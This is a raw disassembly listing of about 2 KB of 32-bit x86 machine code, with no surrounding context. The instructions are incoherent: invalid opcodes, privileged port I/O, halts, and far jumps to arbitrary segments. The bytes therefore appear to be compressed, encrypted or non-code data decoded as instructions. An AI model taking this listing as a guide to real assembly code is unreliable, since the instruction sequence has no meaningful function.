  4117e0:	xlat   BYTE PTR ds:[ebx]
  4117e1:	aaa    
  4117e2:	add    esi,ebp
  4117e4:	rcl    DWORD PTR [edi-0x48049266],1
  4117ea:	test   ebp,ebx
  4117ec:	loope  0x4117cb
  4117ee:	push   ebp
  4117ef:	xor    bl,al
  4117f1:	and    BYTE PTR [ecx+esi*2+0x2d20768e],0x8
  4117f9:	nop
  4117fa:	inc    esi
  4117fb:	mov    BYTE PTR [edx+0x5b5334a5],ch
  411801:	in     al,dx
  411802:	cmp    al,BYTE PTR [eax+0x6d]
  411805:	fwait
  411806:	sbb    eax,0x5a3947
  41180b:	test   esp,esp
  41180d:	xchg   ecx,eax
  41180e:	xchg   DWORD PTR [ebx],ebx
  411810:	inc    esi
  411811:	aam    0x45
  411813:	call   0xf6fbff9c
  411818:	push   ebx
  411819:	es push ds
  41181b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41181c:	sahf   
  41181d:	sub    BYTE PTR [esi-0x33],cl
  411820:	xchg   edi,eax
  411821:	and    al,0x7
  411823:	adc    BYTE PTR ss:[eax+ecx*4-0x5c],0x8f
  411829:	loope  0x411806
  41182b:	outs   dx,DWORD PTR ds:[esi]
  41182c:	xchg   ecx,eax
  41182d:	push   ebp
  41182e:	sub    DWORD PTR [ecx-0x59],eax
  411831:	xchg   esp,eax
  411832:	sbb    DWORD PTR [edi-0x40],0xfffffffd
  411836:	sub    bl,BYTE PTR [edx+ecx*1+0x20]
  41183a:	arpl   WORD PTR [eax-0x10],si
  41183d:	jbe    0x41185e
  41183f:	xor    BYTE PTR ds:0x84a07da5,bh
  411845:	pop    edx
  411846:	push   esp
  411847:	out    0xe6,al
  411849:	inc    esp
  41184a:	mov    cl,0x8d
  41184c:	ror    BYTE PTR [ebp-0x21],0x51
  411850:	pop    esi
  411851:	fcom   DWORD PTR [edi-0x5d029d16]
  411857:	cs pop edx
  411859:	xor    DWORD PTR [ecx],0x62
  41185c:	xchg   BYTE PTR [eax-0x63],ch
  41185f:	jp     0x41180f
  411861:	pop    esp
  411862:	xor    BYTE PTR ds:0x24b9df4c,cl
  411868:	jg     0x41183b
  41186a:	scas   eax,DWORD PTR es:[edi]
  41186b:	shld   DWORD PTR [edx+ebp*2-0x6c2daf2],eax,cl
  411873:	push   es
  411874:	mov    al,0xd6
  411876:	push   ss
  411877:	in     eax,dx
  411878:	jp     0x411849
  41187a:	inc    eax
  41187b:	scas   eax,DWORD PTR es:[edi]
  41187c:	dec    edx
  41187d:	out    dx,eax
  41187e:	inc    bx
  411880:	stos   BYTE PTR es:[edi],al
  411881:	mov    dl,0xf6
  411883:	pop    edx
  411884:	mov    esp,0x5284cff1
  411889:	data16 fwait
  41188b:	mov    ebp,0x908437b
  411890:	dec    ebp
  411891:	shr    BYTE PTR [ebp+0x2b2cc52b],0xcb
  411898:	(bad)  [ecx-0x6]
  41189b:	repnz shl BYTE PTR [edi],0xf0
  41189f:	es cmp edx,esp
  4118a2:	sbb    BYTE PTR [edi-0x69],0x28
  4118a6:	mov    bl,0x9f
  4118a8:	mov    al,ds:0xb745faf1
  4118ad:	data16 hlt 
  4118af:	push   cs
  4118b0:	and    DWORD PTR [ecx+0x70],eax
  4118b3:	jg     0x4118a9
  4118b5:	push   ebp
  4118b6:	xor    BYTE PTR [ecx],bl
  4118b8:	push   ss
  4118b9:	dec    eax
  4118ba:	xchg   ebx,eax
  4118bb:	js     0x4118fa
  4118bd:	mov    edx,DWORD PTR [eax]
  4118bf:	xor    DWORD PTR [esi+0x5d],eax
  4118c2:	sub    bh,bh
  4118c4:	sbb    DWORD PTR [esi+0x79],0x6a2c4424
  4118cb:	push   0xd94d7ae9
  4118d0:	cmp    esp,edi
  4118d2:	popa   
  4118d3:	sbb    edi,DWORD PTR [esi+esi*1]
  4118d6:	jb     0x4118f0
  4118d8:	daa    
  4118d9:	fld    QWORD PTR [ebp-0x4c]
  4118dc:	or     al,0x6e
  4118de:	jae    0x411891
  4118e0:	jle    0x41194b
  4118e2:	adc    eax,DWORD PTR [edx+0x35]
  4118e5:	sar    al,cl
  4118e7:	bound  esi,QWORD PTR [edi-0x6388b737]
  4118ed:	mov    ebp,0xb92bc20e
  4118f2:	sbb    al,0x82
  4118f4:	fld    QWORD PTR [ebx-0x26e87fe8]
  4118fa:	fdiv   st,st(0)
  4118fc:	icebp  
  4118fd:	mov    esp,0xa2a33461
  411902:	adc    al,0x7
  411904:	xor    ecx,DWORD PTR [esi+ecx*4+0x5c337846]
  41190b:	dec    esp
  41190c:	cmp    esi,DWORD PTR [eax+0x4e6f62fd]
  411912:	ds pushf 
  411914:	push   ebx
  411915:	jae    0x411936
  411917:	call   0x802c:0xc042ad50
  41191e:	mov    edx,0x93e34977
  411923:	test   DWORD PTR [edx-0x5629a3d],edi
  411929:	(bad)  
  41192a:	push   esi
  41192b:	mov    ds:0xf8f6a735,eax
  411930:	push   edx
  411931:	mov    ebp,DWORD PTR [esi+0x68f77219]
  411937:	cmp    dl,BYTE PTR [eax-0x6057e9d6]
  41193d:	mov    ?,WORD PTR [esi]
  41193f:	dec    edi
  411940:	push   esi
  411941:	push   ds
  411942:	mov    eax,0xedbc9418
  411947:	nop
  411948:	std    
  411949:	inc    ebx
  41194a:	adc    eax,0x7ee87c0b
  41194f:	cli    
  411950:	add    ah,BYTE PTR [ebx+0x2a]
  411953:	add    ch,al
  411955:	lods   al,BYTE PTR ds:[esi]
  411956:	pop    edx
  411957:	clc    
  411958:	ret    0xe92
  41195b:	inc    ebx
  41195c:	inc    eax
  41195d:	scas   eax,DWORD PTR es:[edi]
  41195e:	loop   0x4118f9
  411960:	adc    esp,DWORD PTR [edi+0x319284bd]
  411966:	inc    esp
  411967:	outs   dx,DWORD PTR ds:[esi]
  411968:	arpl   WORD PTR [edi],bp
  41196a:	xchg   edx,eax
  41196b:	add    DWORD PTR [edx-0x7cc9d690],eax
  411971:	mov    esi,0xa1e9bfb0
  411976:	jge    0x4118f9
  411978:	ins    DWORD PTR es:[edi],dx
  411979:	push   ecx
  41197a:	sbb    al,BYTE PTR ds:0x2973139f
  411980:	or     DWORD PTR [edi-0x2e],ecx
  411983:	mov    al,ds:0x9b9f2ecb
  411988:	xchg   BYTE PTR [ebp+0x7],dh
  41198b:	addr16 pop ds
  41198d:	mov    cl,0x13
  41198f:	loop   0x411965
  411991:	jmp    0x3928:0x52836f12
  411998:	retf   
  411999:	test   eax,0xd5ab5338
  41199e:	fisttp DWORD PTR [esi]
  4119a0:	mov    dh,0x41
  4119a2:	sub    DWORD PTR [esi+0x74],ebx
  4119a5:	push   0x3a
  4119a7:	lsl    esp,WORD PTR [ebx+0x30]
  4119ab:	sahf   
  4119ac:	cmp    al,0x15
  4119ae:	dec    edx
  4119af:	scas   eax,DWORD PTR es:[edi]
  4119b0:	pop    es
  4119b1:	fwait
  4119b2:	daa    
  4119b3:	sub    eax,0xae02079c
  4119b8:	mov    esp,0xfd8200fb
  4119bd:	mov    ch,0xaf
  4119bf:	push   eax
  4119c0:	jae    0x411a1f
  4119c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119c3:	data16 stc 
  4119c5:	jle    0x4119a1
  4119c7:	pop    ebp
  4119c8:	stos   BYTE PTR es:[edi],al
  4119c9:	dec    ecx
  4119ca:	int3   
  4119cb:	jmp    0x607d:0xe3d0981d
  4119d2:	jg     0x411a52
  4119d4:	test   al,0xca
  4119d6:	sbb    ebx,esp
  4119d8:	or     ch,BYTE PTR [ebp-0x1b]
  4119db:	scas   al,BYTE PTR es:[edi]
  4119dc:	je     0x4119f2
  4119de:	pop    ss
  4119df:	pop    esp
  4119e0:	xchg   ebp,eax
  4119e1:	mov    DWORD PTR [edx],esi
  4119e3:	ss xor eax,0xe12ffadf
  4119e9:	adc    eax,0x66d490e3
  4119ee:	xchg   esp,eax
  4119ef:	sbb    BYTE PTR [edi-0x49],0x5f
  4119f3:	pusha  
  4119f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119f5:	sub    eax,edx
  4119f7:	loop   0x411a5f
  4119f9:	arpl   sp,si
  4119fb:	ud1    esp,DWORD PTR [eax+ebx*4+0x63]
  411a00:	pop    eax
  411a01:	inc    esi
  411a02:	sti    
  411a03:	push   ss
  411a04:	mov    ecx,0xb2250c98
  411a09:	mov    ds:0xad5d1880,eax
  411a0e:	cmp    eax,0x6f6ae2f9
  411a13:	mov    bh,0xcd
  411a15:	idiv   DWORD PTR ds:0xfa96b6c7
  411a1b:	cmp    ch,BYTE PTR ds:0x98646740
  411a21:	ret    
  411a22:	cmp    DWORD PTR [edx],ebp
  411a24:	push   eax
  411a25:	cmp    BYTE PTR [edi],bh
  411a27:	push   cs
  411a28:	repnz lods al,BYTE PTR ds:[esi]
  411a2a:	std    
  411a2b:	cwde   
  411a2c:	(bad)  
  411a2d:	sbb    eax,0x81856bc0
  411a32:	arpl   WORD PTR [esi-0x4b68d03a],bp
  411a38:	push   es
  411a39:	sub    BYTE PTR [eax+0x24],cl
  411a3c:	xchg   ebp,eax
  411a3d:	jg     0x411ab8
  411a3f:	call   0xc21285b3
  411a44:	add    edx,DWORD PTR [eax+0x40]
  411a47:	mov    al,BYTE PTR [eax+ecx*8-0x41a264ee]
  411a4e:	inc    eax
  411a4f:	inc    esi
  411a50:	cmp    ecx,ebx
  411a52:	fistp  DWORD PTR [ebp-0x2c]
  411a55:	xlat   BYTE PTR ds:[ebx]
  411a56:	imul   ecx,DWORD PTR [edi],0x3cae5c6
  411a5c:	mov    ch,bh
  411a5e:	add    dh,BYTE PTR [esi-0x7c54bbd4]
  411a64:	in     al,0x4b
  411a66:	xor    eax,0x4dd55f13
  411a6b:	sbb    al,0x93
  411a6d:	mov    ds:0x735fcad0,eax
  411a72:	call   0x11228c1f
  411a77:	fbld   TBYTE PTR [esi+0x2326f100]
  411a7d:	adc    BYTE PTR [edi+0x3e],bl
  411a80:	adc    dh,ch
  411a82:	mov    ah,0x66
  411a84:	(bad)  
  411a85:	outs   dx,DWORD PTR ds:[esi]
  411a86:	dec    ebp
  411a87:	sbb    esi,DWORD PTR [ebx]
  411a89:	xor    dl,al
  411a8b:	in     al,0x7f
  411a8d:	nop
  411a8e:	jno    0x411a5c
  411a90:	pop    ecx
  411a91:	xlat   BYTE PTR ds:[ebx]
  411a92:	lods   eax,DWORD PTR ds:[esi]
  411a93:	push   edi
  411a94:	aas    
  411a95:	pop    eax
  411a96:	and    al,0x43
  411a98:	icebp  
  411a99:	pushw  0x41
  411a9c:	aaa    
  411a9d:	stos   DWORD PTR es:[edi],eax
  411a9e:	lds    ecx,FWORD PTR [edx+ecx*2]
  411aa1:	sub    eax,0x5e7f15f
  411aa6:	mov    eax,edx
  411aa8:	cmp    al,0x94
  411aaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411aab:	pop    es
  411aac:	aad    0xc4
  411aae:	cs test ecx,0xd15d482f
  411ab5:	hlt    
  411ab6:	jne    0x411b12
  411ab8:	cmp    BYTE PTR gs:[esi],ah
  411abb:	push   ecx
  411abc:	cli    
  411abd:	gs xor eax,0xf53dae6f
  411ac3:	inc    eax
  411ac4:	stos   BYTE PTR es:[edi],al
  411ac5:	dec    ecx
  411ac6:	stos   DWORD PTR es:[edi],eax
  411ac7:	mov    ecx,0x9fd999a6
  411acc:	sti    
  411acd:	inc    edi
  411ace:	jnp    0x411acb
  411ad0:	mov    esp,0x4f3eb2ac
  411ad5:	jecxz  0x411a98
  411ad7:	pop    ss
  411ad8:	push   0xf7cc2420
  411add:	test   DWORD PTR [ecx+0x19fcea0d],0x683db59
  411ae7:	jl     0x411aa9
  411ae9:	push   edi
  411aea:	retf   
  411aeb:	mov    esp,0x970a6704
  411af0:	nop
  411af1:	jo     0x411b5b
  411af3:	jns    0x411b29
  411af5:	mov    ch,0xc4
  411af7:	jno    0x411a97
  411af9:	jno    0x411afc
  411afb:	mov    ah,0xa
  411afd:	shl    BYTE PTR [ecx],1
  411aff:	ror    esi,cl
  411b01:	adc    BYTE PTR [edi+0x10],bh
  411b04:	cmc    
  411b05:	js     0x411adc
  411b07:	inc    edx
  411b08:	enter  0x2e5c,0x35
  411b0c:	or     eax,0x74490082
  411b11:	fnstcw WORD PTR [esi-0x3a]
  411b14:	test   DWORD PTR ds:0x4b357fdd,edi
  411b1a:	xchg   DWORD PTR [ebp-0x344ae6ad],edx
  411b20:	adc    BYTE PTR [edi],0x68
  411b23:	sbb    BYTE PTR [ecx+0x14636187],cl
  411b29:	or     DWORD PTR [ebx-0x77],edx
  411b2c:	mov    DWORD PTR ds:0xdd79f031,ebp
  411b32:	daa    
  411b33:	fisub  WORD PTR [ebp+0x4efbdf32]
  411b39:	jno    0x411afd
  411b3b:	lea    esi,[esi+ebp*4+0x562478ed]
  411b42:	sar    BYTE PTR [ebp-0x86d71aa],0x21
  411b49:	pop    ds
  411b4a:	lea    ecx,[eax+edi*1+0x60]
  411b4e:	mov    dh,0xe3
  411b50:	mov    ss,ebx
  411b52:	data16 jp 0x411ba3
  411b55:	adc    esp,DWORD PTR [esi+eax*1+0xb887242]
  411b5c:	out    dx,eax
  411b5d:	push   cs
  411b5e:	fs test ax,0xa8b5
  411b63:	dec    edx
  411b64:	not    DWORD PTR [ecx]
  411b66:	mov    ebp,0x8561704b
  411b6b:	loope  0x411b26
  411b6d:	jmp    0x6130f3b9
  411b72:	ret    
  411b73:	lds    edi,FWORD PTR [edx]
  411b75:	pop    ebp
  411b76:	jg     0x411b8e
  411b78:	jg     0x411bee
  411b7a:	sbb    eax,edi
  411b7c:	dec    ebx
  411b7d:	mov    ds:0xd6d436dc,eax
  411b82:	adc    al,0x96
  411b84:	push   ecx
  411b85:	or     eax,0xe7018e65
  411b8a:	das    
  411b8b:	sbb    ch,cl
  411b8d:	sub    BYTE PTR [ebx],ch
  411b8f:	inc    edi
  411b90:	inc    edx
  411b91:	pop    eax
  411b92:	xchg   ecx,eax
  411b93:	lods   al,BYTE PTR ds:[esi]
  411b94:	call   0xaf56:0xd8a97e3a
  411b9b:	lods   al,BYTE PTR ds:[esi]
  411b9c:	add    edx,ebp
  411b9e:	or     dl,BYTE PTR [edi]
  411ba0:	jnp    0x411be0
  411ba2:	aas    
  411ba3:	xor    BYTE PTR [eax+ecx*2-0x7d],ch
  411ba7:	sub    BYTE PTR [esi-0x22],bl
  411baa:	add    DWORD PTR [ecx],ebx
  411bac:	mul    bh
  411bae:	mov    edi,0xc0bc7ee7
  411bb3:	jg     0x411bb1
  411bb5:	popf   
  411bb6:	jnp    0x411b97
  411bb8:	add    DWORD PTR ds:0xf29fa556,ebx
  411bbe:	rol    BYTE PTR [eax+0x1f323f61],0x37
  411bc5:	mov    BYTE PTR [ebp-0x4fa176d8],ah
  411bcb:	xchg   esp,eax
  411bcc:	sub    eax,0x42108023
  411bd1:	fwait
  411bd2:	add    eax,DWORD PTR ds:0xa1fd18ca
  411bd8:	jmp    0x47c40f86
  411bdd:	jae    0x411bdc
  411bdf:	pop    ecx
  411be0:	xchg   ecx,eax
  411be1:	pop    ebp
  411be2:	ds sub al,0x8e
  411be5:	jg     0x411c2e
  411be7:	push   0xcad4001c
  411bec:	mov    ebp,0x19f03e2d
  411bf1:	dec    ebp
  411bf2:	fcmovnb st,st(6)
  411bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bf5:	loope  0x411bf9
  411bf7:	mov    ?,WORD PTR [esi+0x62]
  411bfa:	(bad)  
  411bfb:	aad    0x3
  411bfd:	das    
  411bfe:	or     eax,0x6c718fb0
  411c03:	push   ebp
  411c04:	fsubr  DWORD PTR [eax]
  411c06:	movnti DWORD PTR [ebp-0x4ac0a11f],edx
  411c0d:	out    dx,eax
  411c0e:	pop    esp
  411c0f:	sbb    BYTE PTR [ecx-0x66],ch
  411c12:	add    bh,BYTE PTR [edx-0x47]
  411c15:	jecxz  0x411c54
  411c17:	out    0x20,eax
  411c19:	aaa    
  411c1a:	ret    
  411c1b:	je     0x411bf3
  411c1d:	lahf   
  411c1e:	jmp    0x411ba6
  411c20:	leave  
  411c21:	loope  0x411c2e
  411c23:	(bad)  
  411c25:	mov    BYTE PTR [edx-0x37],bl
  411c28:	sbb    DWORD PTR ds:0x4d33016d,ecx
  411c2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c2f:	popa   
  411c30:	inc    ebx
  411c31:	imul   esp,DWORD PTR [edi+0x17],0xcbe0f601
  411c38:	dec    edx
  411c39:	pop    ebp
  411c3a:	pop    esp
  411c3b:	test   eax,0x4b334441
  411c40:	es xchg ebx,eax
  411c42:	jmp    0x9dbc:0x68134b96
  411c49:	loop   0x411c40
  411c4b:	leave  
  411c4c:	pop    esi
  411c4d:	cdq    
  411c4e:	dec    ebp
  411c4f:	mov    bh,0x78
  411c51:	mov    ds,eax
  411c53:	popa   
  411c54:	jne    0x411c15
  411c56:	fwait
  411c57:	and    DWORD PTR [eax+0x4],ebp
  411c5a:	dec    ecx
  411c5b:	loopne 0x411c0b
  411c5d:	cmp    BYTE PTR [edx-0x5f],0x8
  411c61:	shl    BYTE PTR [ebx+eiz*2-0x3330b59f],0x9b
  411c69:	imul   edi,eax,0x108853a1
  411c6f:	das    
  411c70:	std    
  411c71:	dec    ebx
  411c72:	aaa    
  411c73:	(bad)  
  411c75:	imul   ebx,DWORD PTR [ebp+0x6b34a513],0x33
  411c7c:	int3   
  411c7d:	test   BYTE PTR [esi+0x41209174],bl
  411c83:	pop    ds
  411c84:	jbe    0x411c82
  411c86:	(bad)  
  411c87:	adc    esp,edx
  411c89:	xor    eax,0x9e06bc2a
  411c8e:	jae    0x411d0d
  411c90:	push   ss
  411c91:	cwde   
  411c92:	and    ebp,DWORD PTR [ebp-0x52a7e96f]
  411c98:	fsubr  QWORD PTR [edx]
  411c9a:	mov    BYTE PTR [esp+esi*4-0x79ac9454],ah
  411ca1:	mov    edi,0x45072d3b
  411ca6:	sub    DWORD PTR [ebx],ecx
  411ca8:	dec    ebp
  411ca9:	dec    esi
  411caa:	cmp    ecx,DWORD PTR [ebx-0x49843858]
  411cb0:	pushf  
  411cb1:	cmp    edi,DWORD PTR [ecx+ebx*2+0xe74cb0f]
  411cb8:	jmp    0x9a426f99
  411cbd:	adc    al,0x60
  411cbf:	cmp    eax,0x323deb6c
  411cc4:	into   
  411cc5:	std    
  411cc6:	xchg   DWORD PTR [ecx],eax
  411cc8:	xor    BYTE PTR [edi+0x47],dl
  411ccb:	push   0xe9fd522f
  411cd0:	jg     0x411c84
  411cd2:	in     al,0xde
  411cd4:	cmp    WORD PTR [esi-0x4d60bf0a],0x4
  411cdc:	mov    al,ds:0xb0bbf551
  411ce1:	bound  edi,QWORD PTR es:[edx+0x7f]
  411ce5:	xor    ah,BYTE PTR [ecx+0x1cf71c2c]
  411ceb:	loop   0x411d48
  411ced:	inc    edx
  411cee:	test   DWORD PTR [edx+ecx*1-0x71],esp
  411cf2:	or     eax,ecx
  411cf4:	mov    esp,0xda9d65f0
  411cf9:	out    dx,eax
  411cfa:	cmc    
  411cfb:	dec    eax
  411cfc:	jmp    0x411c95
  411cfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cff:	sub    eax,0xf63ba95e
  411d04:	fidiv  WORD PTR [ecx+0x6eb95e83]
  411d0a:	adc    eax,0x8226b32b
  411d0f:	jmp    0xbce9:0xf1804ba2
  411d16:	mov    ds:0xf16962d8,eax
  411d1b:	inc    eax
  411d1c:	xor    eax,0x9d340290
  411d21:	popa   
  411d22:	and    dh,bh
  411d24:	dec    ebp
  411d25:	fist   WORD PTR [ecx]
  411d27:	ficom  WORD PTR [ebx+ebp*1-0x30]
  411d2b:	out    dx,al
  411d2c:	iret   
  411d2d:	pushf  
  411d2e:	(bad)  
  411d30:	mov    ebx,0x19506b56
  411d35:	mov    ds:0x10293422,al
  411d3a:	sub    al,0x34
  411d3c:	fild   QWORD PTR [edx-0x4bbb984]
  411d42:	in     al,dx
  411d43:	pusha  
  411d44:	out    dx,eax
  411d45:	in     eax,0x2f
  411d47:	inc    esi
  411d48:	ficomp DWORD PTR [ebx+ebp*2-0x25c7469d]
  411d4f:	ret    
  411d50:	iret   
  411d51:	out    dx,al
  411d52:	(bad)  
  411d53:	mov    ebx,0xbf30f07e
  411d58:	outs   dx,DWORD PTR ds:[esi]
  411d59:	outs   dx,BYTE PTR ds:[esi]
  411d5a:	retf   
  411d5b:	mov    edx,0xa4b4f5f7
  411d60:	icebp  
  411d61:	mov    ds:0xafa74154,al
  411d66:	jle    0x411dc2
  411d68:	les    edi,FWORD PTR [esi-0x63]
  411d6b:	and    al,0x9
  411d6d:	in     eax,0x10
  411d6f:	mov    ebp,0xbb2b7e07
  411d74:	mov    ds:0x9c680917,al
  411d79:	cmp    BYTE PTR [eax-0x44],bh
  411d7c:	or     eax,0x51bcc52d
  411d81:	loopne 0x411da3
  411d83:	aas    
  411d84:	push   ebp
  411d85:	add    cl,dl
  411d87:	addr16 int3 
  411d89:	loop   0x411d58
  411d8b:	repnz inc esp
  411d8d:	dec    edi
  411d8e:	jl     0x411d7e
  411d90:	lods   al,BYTE PTR ds:[esi]
  411d91:	jbe    0x411d55
  411d93:	fucom  st(2)
  411d95:	xchg   edx,eax
  411d96:	das    
  411d97:	jae    0x411e0f
  411d99:	mov    esi,0xe65bbf4c
  411d9e:	mov    al,0xd7
  411da0:	jg     0x411d85
  411da2:	fldenv [ebp-0x15e2f4e2]
  411da8:	or     al,0x84
  411daa:	push   ss
  411dab:	je     0x411e27
  411dad:	inc    esi
  411dae:	in     al,0x40
  411db0:	push   ss
  411db1:	popf   
  411db2:	push   esi
  411db3:	jl     0x411d86
  411db5:	(bad)  
  411db6:	imul   eax,DWORD PTR [eax],0xffffffd7
  411db9:	(bad)  
  411dba:	scas   eax,DWORD PTR es:[edi]
  411dbb:	nop
  411dbc:	mov    edi,0x972d633c
  411dc1:	jb     0x411dcd
  411dc3:	icebp  
  411dc4:	aaa    
  411dc5:	pop    ebp
  411dc6:	lahf   
  411dc7:	mov    ?,WORD PTR [eax-0x45e46222]
  411dcd:	test   BYTE PTR [esi+0x6f1469ae],0x92
  411dd4:	push   ebp
  411dd5:	ds cmp ecx,DWORD PTR ss:[ebp-0x5e]
  411dda:	mov    al,ds:0x1024100f
  411ddf:	(bad)  
  411de0:	les    ebx,FWORD PTR [ebx-0x20ca68ef]
  411de6:	push   ss
  411de7:	repz daa 
  411de9:	or     edi,DWORD PTR [eax]
  411deb:	mov    ebp,0x1b24f3c
  411df0:	mov    ds:0xe71c4c1e,al
  411df5:	or     eax,0x6d05391c
  411dfa:	loope  0x411de2
  411dfc:	ror    DWORD PTR [edx+0x51ccca6d],0xea
  411e03:	add    ecx,esi
  411e05:	shl    BYTE PTR [edx+0x60],1
  411e08:	outs   dx,BYTE PTR ds:[esi]
  411e09:	call   FWORD PTR [ebp+0x49]
  411e0c:	inc    ebx
  411e0d:	jb     0x411d92
  411e0f:	xchg   edi,eax
  411e10:	xchg   esp,eax
  411e11:	fdivp  st(2),st
  411e13:	and    esi,DWORD PTR [edi+eax*8-0x1d]
  411e17:	das    
  411e18:	xor    bh,0xa8
  411e1b:	scas   eax,DWORD PTR es:[edi]
  411e1c:	mov    ah,0xc9
  411e1e:	jmp    0x411e33
  411e20:	loope  0x411e88
  411e22:	inc    esi
  411e23:	pop    es
  411e24:	push   esp
  411e25:	inc    edx
  411e26:	inc    esp
  411e27:	dec    esp
  411e28:	aam    0xc0
  411e2a:	mov    ds:0x32bc9e8a,al
  411e2f:	sub    eax,DWORD PTR [edx-0x692387b3]
  411e35:	sub    ah,ah
  411e37:	cmc    
  411e38:	mov    cl,0x6a
  411e3a:	arpl   WORD PTR [edx+0x4d413542],bp
  411e40:	lods   eax,DWORD PTR ds:[esi]
  411e41:	in     al,0xe1
  411e43:	pop    ebp
  411e44:	lods   al,BYTE PTR ds:[esi]
  411e45:	mov    esp,DWORD PTR [edx+0x4a]
  411e48:	out    0x88,eax
  411e4a:	pop    eax
  411e4b:	add    al,0xea
  411e4d:	test   DWORD PTR [ebp+0x3e],ebp
  411e50:	xor    eax,0x4a141d0f
  411e55:	adc    al,bl
  411e57:	je     0x411e0f
  411e59:	jbe    0x411ec7
  411e5b:	jb     0x411e9e
  411e5d:	mov    esi,DWORD PTR [eax+0x7f]
  411e60:	lock adc al,0xbb
  411e63:	data16 fidiv DWORD PTR [ebx]
  411e66:	(bad)  [edi-0x15]
  411e69:	dec    edi
  411e6a:	inc    ebx
  411e6b:	stos   DWORD PTR es:[edi],eax
  411e6c:	add    cl,BYTE PTR [ebx+0x3be5585c]
  411e72:	ret    0x1e85
  411e75:	shr    dl,1
  411e77:	fistp  QWORD PTR [eax+0x7d382a5c]
  411e7d:	outs   dx,DWORD PTR ds:[esi]
  411e7e:	jle    0x411ea8
  411e80:	stos   BYTE PTR es:[edi],al
  411e81:	sub    eax,ecx
  411e83:	mov    eax,ds:0x735352e7
  411e88:	adc    al,bh
  411e8a:	fst    DWORD PTR [ebp-0x26156244]
  411e90:	mov    eax,ds:0x5fde82df
  411e95:	pop    edx
  411e96:	jle    0x411e4a
  411e98:	xlat   BYTE PTR ds:[ebx]
  411e99:	push   ebp
  411e9a:	add    ebx,DWORD PTR [esi+eiz*1]
  411e9d:	push   edx
  411e9e:	add    BYTE PTR [eax],al
  411ea0:	xchg   ebx,eax
  411ea1:	(bad)  
  411ea2:	hlt    
  411ea3:	dec    ebp
  411ea4:	sub    al,0xc2
  411ea6:	push   ebx
  411ea7:	pop    ss
  411ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ea9:	sbb    edx,ecx
  411eab:	cmp    DWORD PTR [edx-0x62],esp
  411eae:	adc    BYTE PTR [edi+0x30],al
  411eb1:	enter  0xba6,0x8f
  411eb5:	adc    bh,BYTE PTR [ecx+0x50]
  411eb8:	aad    0x63
  411eba:	mov    dh,0x92
  411ebc:	dec    esi
  411ebd:	int3   
  411ebe:	ins    DWORD PTR es:[edi],dx
  411ebf:	and    cl,BYTE PTR [esi+0x46b663a]
  411ec5:	es pop edx
  411ec7:	dec    esi
  411ec8:	mov    edi,?
  411eca:	add    bl,dl
  411ecc:	push   edi
  411ecd:	ret    
  411ece:	xchg   edx,eax
  411ecf:	mov    ebx,0x746b699f
  411ed4:	or     DWORD PTR [ecx],esp
  411ed6:	sub    eax,0x24ab5f8f
  411edb:	loop   0x411f50
  411edd:	inc    ebx
  411ede:	enter  0x5df0,0x39
  411ee2:	int    0x29
  411ee4:	test   al,bh
  411ee6:	pop    ebp
  411ee7:	hlt    
  411ee8:	or     dh,bl
  411eea:	push   0x9f2c9cd5
  411eef:	push   edx
  411ef0:	dec    eax
  411ef1:	(bad)  
  411ef4:	jno    0x411eaf
  411ef6:	mov    al,0x73
  411ef8:	mov    eax,ss
  411efa:	pop    edi
  411efb:	into   
  411efc:	cmp    ah,BYTE PTR ds:0xaebfcd20
  411f02:	ins    DWORD PTR es:[edi],dx
  411f03:	mov    WORD PTR [eax+0x15],gs
  411f06:	enter  0xfb2c,0x40
  411f0a:	jmp    0x1914:0xf006d680
  411f11:	dec    dl
  411f13:	jmp    0x1d33668d
  411f18:	jae    0x411f6a
  411f1a:	into   
  411f1b:	(bad)  
  411f1d:	fstp   TBYTE PTR [esi]
  411f1f:	lea    ebx,[edx+0x7f]
  411f22:	mov    dh,0xd0
  411f24:	pop    ebx
  411f25:	mov    ah,0xa
  411f27:	and    BYTE PTR [edx-0x6b],0x5f
  411f2b:	lods   eax,DWORD PTR ds:[esi]
  411f2c:	add    DWORD PTR [esi-0x54],0x5e
  411f30:	call   0xe3f713f
  411f35:	pop    ecx
  411f36:	rcl    BYTE PTR [ecx],cl
  411f38:	mov    BYTE PTR ds:0x8b1ccdb6,cl
  411f3e:	add    eax,0xd009d450
  411f43:	in     al,0x1
  411f45:	xor    al,0x3f
  411f47:	jecxz  0x411f51
  411f49:	outs   dx,BYTE PTR ds:[esi]
  411f4a:	sub    BYTE PTR [ebx-0x6540bb5],dh
  411f50:	inc    esp
  411f51:	and    eax,0x2ced6e05
  411f56:	pop    ss
  411f57:	jge    0x411f0b
  411f59:	mov    ebx,0xc4c1b2b
  411f5e:	(bad)  
  411f5f:	loopne 0x411f65
  411f61:	push   ebp
  411f62:	push   ss
  411f63:	jbe    0x411f07
  411f65:	jo     0x411f72
  411f67:	icebp  
  411f68:	mov    fs,ebp
  411f6a:	lods   al,BYTE PTR ds:[esi]
  411f6b:	or     BYTE PTR [esi-0x4784d12d],dl
  411f71:	sti    
  411f72:	fistp  QWORD PTR [ecx-0x52941256]
  411f78:	cmp    bh,BYTE PTR ds:0xdd8572e9
  411f7e:	rcr    BYTE PTR [eax+edx*8+0x20],cl
  411f82:	inc    edi
  411f83:	data16 jecxz 0x411f2c
  411f86:	push   edx
  411f87:	cmc    
  411f88:	je     0x411f78
  411f8a:	ret    0x7a24
  411f8d:	xor    edi,DWORD PTR [ecx+0x5f]
  411f90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f91:	jns    0x411fa7
  411f93:	mov    WORD PTR [ecx],ds
  411f95:	add    al,bl
  411f97:	and    cl,BYTE PTR [eax]
  411f99:	arpl   WORD PTR ds:0x321da57b,di
  411f9f:	frstor [ebp+0x28f79d0f]
  411fa5:	pusha  
  411fa6:	inc    ebx
  411fa7:	and    DWORD PTR ds:0xb974219,ebx
  411fad:	dec    esi
  411fae:	jns    0x411f75
  411fb0:	in     eax,0xf4
  411fb2:	push   ebp
  411fb3:	pop    es
  411fb4:	mov    ah,0xbf
  411fb6:	stos   DWORD PTR es:[edi],eax
  411fb7:	xchg   edx,eax
